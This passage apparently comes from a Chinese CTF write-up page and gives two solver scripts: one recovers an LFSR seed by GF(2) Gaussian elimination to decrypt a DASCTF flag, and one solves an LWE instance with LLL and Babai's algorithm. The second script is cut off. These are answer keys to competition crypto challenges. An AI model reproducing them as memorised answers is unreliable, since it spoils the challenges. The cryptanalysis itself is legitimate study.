class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">利用LFSR的线性性和flag字符特征求解</span><br><span class="hljs-string">关键观察: 可打印ASCII字符(0x20-0x7e)的最高位(bit 7)总是0</span><br><span class="hljs-string">这给我们提供了64个线性方程</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>mask = <span class="hljs-number">9319439021858903464</span><br>c = <span class="hljs-number">8882504877732087312989345828667663333297225833982945014279010438327750150593504327259176959316943362605442206624947923157363187067410478202161873663103506</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_matrix</span>(<span class="hljs-params">mask, output_len</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;构建输出位对seed位的依赖矩阵 (在GF(2)上)&quot;&quot;&quot;</span><br>    M = np.zeros((output_len, <span class="hljs-number">64</span>), dtype=np.uint8)<br>    <br>    state = [np.zeros(<span class="hljs-number">64</span>, dtype=np.uint8) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        state[i][i] = <span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">for</span> out_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(output_len):<br>        out_expr = np.zeros(<span class="hljs-number">64</span>, dtype=np.uint8)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> (mask &gt;&gt; i) &amp; <span class="hljs-number">1</span>:<br>                out_expr = (out_expr + state[i]) % <span class="hljs-number">2</span><br>        M[out_idx] = out_expr<br>        new_state = [out_expr.copy()] + state[:-<span class="hljs-number">1</span>]<br>        state = new_state<br>    <br>    <span class="hljs-keyword">return</span> M<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gauss_gf2</span>(<span class="hljs-params">A, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;GF(2)上的高斯消元&quot;&quot;&quot;</span><br>    A = A.copy().astype(np.int64)<br>    b = b.copy().astype(np.int64)<br>    n, m = A.shape<br>    <br>    Ab = np.hstack([A, b.reshape(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)])<br>    <br>    pivot_row = <span class="hljs-number">0</span><br>    pivot_cols = []<br>    <br>    <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pivot_row, n):<br>            <span class="hljs-keyword">if</span> Ab[row, col] == <span class="hljs-number">1</span>:<br>                Ab[[pivot_row, row]] = Ab[[row, pivot_row]]<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            <span class="hljs-keyword">continue</span><br>        <br>        pivot_cols.append(col)<br>        <br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            <span class="hljs-keyword">if</span> row != pivot_row <span class="hljs-keyword">and</span> Ab[row, col] == <span class="hljs-number">1</span>:<br>                Ab[row] = (Ab[row] + Ab[pivot_row]) % <span class="hljs-number">2</span><br>        <br>        pivot_row += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># 提取解</span><br>    x = np.zeros(m, dtype=np.int64)<br>    <span class="hljs-keyword">for</span> i, col <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pivot_cols):<br>        x[col] = Ab[i, -<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">return</span> x, pivot_cols, Ab<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 构建LFSR矩阵...&quot;</span>)<br>M = build_matrix(mask, <span class="hljs-number">512</span>)<br><br><span class="hljs-comment"># c的比特</span><br>c_bits = np.array([(c &gt;&gt; (<span class="hljs-number">511</span> - i)) &amp; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)], dtype=np.uint8)<br><br><span class="hljs-comment"># 利用可打印字符特征: 每个字节的bit7 = 0</span><br><span class="hljs-comment"># 即 flag_bits[byte*8] = 0 for all bytes</span><br><span class="hljs-comment"># flag_bit = c_bit XOR key_bit</span><br><span class="hljs-comment"># 所以 key_bits[byte*8] = c_bits[byte*8]</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 构建线性方程组...&quot;</span>)<br><br><span class="hljs-comment"># 收集每个字节第一位(bit 7)的方程</span><br><span class="hljs-comment"># key_bit[i] = M[i] @ seed</span><br><span class="hljs-comment"># 约束: key_bit[byte*8] = c_bit[byte*8] (因为flag的bit7=0)</span><br><br>equations = []<br>targets = []<br><br><span class="hljs-keyword">for</span> byte_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    bit_idx = byte_idx * <span class="hljs-number">8</span>  <span class="hljs-comment"># 每个字节的最高位</span><br>    equations.append(M[bit_idx])<br>    targets.append(c_bits[bit_idx])<br><br>A = np.array(equations, dtype=np.uint8)<br>b = np.array(targets, dtype=np.uint8)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 方程组大小: <span class="hljs-subst">&#123;A.shape&#125;</span>&quot;</span>)<br><br>x, pivot_cols, Ab = gauss_gf2(A, b)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 主元列数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(pivot_cols)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pivot_cols) == <span class="hljs-number">64</span>:<br>    <span class="hljs-comment"># 唯一解</span><br>    seed_val = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(x[i]) &lt;&lt; i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 找到唯一seed: <span class="hljs-subst">&#123;seed_val&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 有自由变量，需要枚举</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 有 <span class="hljs-subst">&#123;<span class="hljs-number">64</span> - <span class="hljs-built_in">len</span>(pivot_cols)&#125;</span> 个自由变量，开始枚举...&quot;</span>)<br>    <br>    free_cols = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> pivot_cols]<br>    <br>    <span class="hljs-comment"># 枚举自由变量的所有可能值</span><br>    <span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br>    <br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> free_vals <span class="hljs-keyword">in</span> product([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], repeat=<span class="hljs-built_in">len</span>(free_cols)):<br>        <span class="hljs-comment"># 设置自由变量</span><br>        x_try = x.copy()<br>        <span class="hljs-keyword">for</span> i, col <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(free_cols):<br>            x_try[col] = free_vals[i]<br>        <br>        <span class="hljs-comment"># 回代计算主元变量</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pivot_cols) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            col = pivot_cols[i]<br>            <span class="hljs-comment"># A[i] @ x = b[i]</span><br>            <span class="hljs-comment"># x[col] = b[i] XOR sum(A[i][j]*x[j] for j != col)</span><br>            val = Ab[i, -<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>                <span class="hljs-keyword">if</span> j != col <span class="hljs-keyword">and</span> Ab[i, j] == <span class="hljs-number">1</span>:<br>                    val ^= x_try[j]<br>            x_try[col] = val<br>        <br>        seed_val = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(x_try[i]) &lt;&lt; i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>))<br>        <br>        <span class="hljs-comment"># 验证这个seed是否产生可打印flag</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">seed_v, mask_v, n</span>):<br>            key = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>                temp = seed_v &amp; mask_v<br>                out = <span class="hljs-built_in">bin</span>(temp).count(<span class="hljs-string">&#x27;1&#x27;</span>) % <span class="hljs-number">2</span><br>                key = (key &lt;&lt; <span class="hljs-number">1</span>) | out<br>                seed_v = ((seed_v &lt;&lt; <span class="hljs-number">1</span>) | out) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> key<br>        <br>        key = get_key(seed_val, mask, <span class="hljs-number">512</span>)<br>        flag_long = c ^ key<br>        flag_bytes = long_to_bytes(flag_long)<br>        <br>        <span class="hljs-comment"># 检查是否全是可打印字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">0x20</span> &lt;= b &lt;= <span class="hljs-number">0x7e</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag_bytes):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 找到有效seed: <span class="hljs-subst">&#123;seed_val&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flag内容: <span class="hljs-subst">&#123;flag_bytes&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 完整Flag: DASCTF&#123;&#123;<span class="hljs-subst">&#123;flag_bytes.decode()&#125;</span>&#125;&#125;&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 未找到有效解&quot;</span>)<br><br><span class="hljs-comment"># 如果是唯一解，直接验证</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pivot_cols) == <span class="hljs-number">64</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">seed_v, mask_v, n</span>):<br>        key = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            temp = seed_v &amp; mask_v<br>            out = <span class="hljs-built_in">bin</span>(temp).count(<span class="hljs-string">&#x27;1&#x27;</span>) % <span class="hljs-number">2</span><br>            key = (key &lt;&lt; <span class="hljs-number">1</span>) | out<br>            seed_v = ((seed_v &lt;&lt; <span class="hljs-number">1</span>) | out) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> key<br>    <br>    key = get_key(seed_val, mask, <span class="hljs-number">512</span>)<br>    flag_long = c ^ key<br>    flag_bytes = long_to_bytes(flag_long)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flag内容: <span class="hljs-subst">&#123;flag_bytes&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 完整Flag: DASCTF&#123;&#123;<span class="hljs-subst">&#123;flag_bytes.decode()&#125;</span>&#125;&#125;&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 解码失败: <span class="hljs-subst">&#123;flag_bytes.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="two-examples"><a href="#two-examples" class="headerlink" title="two_examples"></a>two_examples</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 读取数据</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;M.matrix&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = json.load(f)<br>    A_list = <span class="hljs-built_in">eval</span>(data[<span class="hljs-string">&quot;A&quot;</span>])<br>    B_list = <span class="hljs-built_in">eval</span>(data[<span class="hljs-string">&quot;B&quot;</span>])<br>    p = <span class="hljs-built_in">int</span>(data[<span class="hljs-string">&quot;p&quot;</span>])<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;v.vector&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = json.load(f)<br>    b1_list = <span class="hljs-built_in">eval</span>(data[<span class="hljs-string">&quot;b1&quot;</span>])<br>    b2_list = <span class="hljs-built_in">eval</span>(data[<span class="hljs-string">&quot;b2&quot;</span>])<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;RSA.enc&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = json.load(f)<br>    N = <span class="hljs-built_in">int</span>(data[<span class="hljs-string">&quot;N&quot;</span>])<br>    c = <span class="hljs-built_in">int</span>(data[<span class="hljs-string">&quot;c&quot;</span>])<br><br>n = <span class="hljs-number">20</span><br>m = <span class="hljs-number">30</span><br><br>A = matrix(GF(p), A_list)<br>B = matrix(GF(p), B_list)<br>b1 = vector(GF(p), b1_list)<br>b2 = vector(GF(p), b2_list)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p bits: <span class="hljs-subst">&#123;p.bit_length()&#125;</span>&quot;</span>)<br>sys.stdout.flush()<br><br>AB_plus = A + B<br>AB_minus = A - B<br>b_plus = b1 + b2<br>b_minus = b1 - b2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_lwe_cvp_correct</span>(<span class="hljs-params">M, b, error_bound=<span class="hljs-number">2</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    正确的 CVP 方法解决 LWE: b = s*M + e (mod p)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    构造格 L = &#123;x*M + p*k : x ∈ Z^n, k ∈ Z^m&#125;</span><br><span class="hljs-string">    然后 b - e ∈ L，使用 CVP 找最近格点</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    n_rows, m_cols = M.dimensions()  <span class="hljs-comment"># n x m = 20 x 30</span><br>    p_val = <span class="hljs-built_in">int</span>(M.base_ring().characteristic())<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CVP method: LWE with <span class="hljs-subst">&#123;n_rows&#125;</span>x<span class="hljs-subst">&#123;m_cols&#125;</span> matrix&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    M_int = matrix(ZZ, [[<span class="hljs-built_in">int</span>(M[i,j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m_cols)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_rows)])<br>    b_int = vector(ZZ, [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b])<br>    <br>    <span class="hljs-comment"># 格 L = &#123;y ∈ Z^m : y ≡ x*M (mod p) for some x ∈ Z^n&#125;</span><br>    <span class="hljs-comment"># 等价于 L = M 的行向量张成的空间 + p*Z^m</span><br>    <span class="hljs-comment"># </span><br>    <span class="hljs-comment"># 格基矩阵（行向量）：</span><br>    <span class="hljs-comment"># [ M    ]  n 行</span><br>    <span class="hljs-comment"># [p*I_m ]  m 行</span><br>    <span class="hljs-comment"># </span><br>    <span class="hljs-comment"># 这是 (n+m) x m = 50 x 30 的矩阵，生成 m=30 维的格</span><br>    <br>    L_basis_rows = M_int.stack(p_val * identity_matrix(ZZ, m_cols))<br>    <span class="hljs-comment"># L_basis_rows 是 50 x 30 矩阵</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Lattice basis: <span class="hljs-subst">&#123;L_basis_rows.dimensions()&#125;</span>&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    <span class="hljs-comment"># 使用 HNF 得到真正的格基（30 x 30）</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computing HNF...&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    L_hnf = L_basis_rows.hermite_form()<br>    <span class="hljs-comment"># 取非零行作为格基</span><br>    L_basis = []<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> L_hnf:<br>        <span class="hljs-keyword">if</span> row != <span class="hljs-number">0</span>:<br>            L_basis.append(row)<br>    <br>    L_basis = matrix(ZZ, L_basis)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;HNF basis: <span class="hljs-subst">&#123;L_basis.dimensions()&#125;</span>&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    <span class="hljs-comment"># LLL 规约</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Running LLL...&quot;</span>)<br>    sys.stdout.flush()<br>    L_lll = L_basis.LLL()<br>    <br>    <span class="hljs-comment"># CVP: 找 b_int 到格的最近点</span><br>    <span class="hljs-comment"># 使用 Babai&#x27;s nearest plane algorithm</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Running Babai&#x27;s CVP...&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    <span class="hljs-comment"># Gram-Schmidt 正交化</span><br>    L_gs, mu = L_lll.gram_schmidt()<br>    <br>    <span class="hljs-comment"># Babai&#x27;s nearest plane</span><br>    target = vector(QQ, b_int)<br>    closest = vector(ZZ, [<span class="hljs-number">0</span>] * m_cols)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L_lll.nrows() - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 计算 target 在第 i 个 Gram-Schmidt 向量上的投影系数</span><br>        gs_vec = L_gs[i]<br>        coeff = target.dot_product(gs_vec) / gs_vec.dot_product(gs_vec)<br>        coeff_rounded = <span class="hljs-built_in">round</span>(coeff)<br>        <br>        <span class="hljs-comment"># 减去该分量</span><br>        target = target - coeff_rounded * vector(QQ, L_lll[i])<br>        closest = closest + coeff_rounded * L_lll[i]<br>    <br>    <span class="hljs-comment"># 计算误差</span><br>    error = b_int - closest<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Closest vector found&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error (first 10): <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(error[:<span class="hljs-number">10</span>])&#125;</span>&quot;</span>)<br>    sys.stdout.flush()<br>    <br>    <span class="hljs-comment"># 检查误差是否在范围内</span><br>    e_reduced = []<br>    valid = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> e_i <span class="hljs-keyword">in</span> error:<br>        e_i = <span class="hljs-built_in">int</span>(e_i)<br>        <span class="hljs-keyword">if</span> e_i &gt; p_val // <span class="hljs-number">2</span>:<br>            e_i -= p_val<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(e_i) 